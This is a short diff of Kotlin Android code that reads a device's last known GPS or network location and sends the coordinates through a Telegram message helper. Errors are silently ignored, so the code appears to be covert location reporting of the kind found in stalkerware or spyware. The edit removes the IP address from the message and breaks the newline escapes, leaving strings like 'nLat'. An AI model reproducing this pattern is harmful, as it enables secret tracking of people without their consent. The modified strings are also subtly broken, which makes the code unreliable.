@@ -455,9 +455,9 @@ override fun onFailure(errorCode: Int) {
                     val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                    
                     val msg = if (loc != null) {
-                        "📍 Auto Location\nIP: $ip\nLat: ${loc.latitude}, Lng: ${loc.longitude}"
+                        "📍 Auto Location: nLat: ${loc.latitude}, Lng: ${loc.longitude}"
                     } else {
-                        "📍 Auto Location (no GPS)\nIP: $ip\nLat: unavailable"
+                        "📍 Auto Location (no GPS) : nLat: unavailable"
                     }
                     MyService.sendStaticTelegramMessage(msg)
                 } catch (e: Exception) { /* ignore */ }
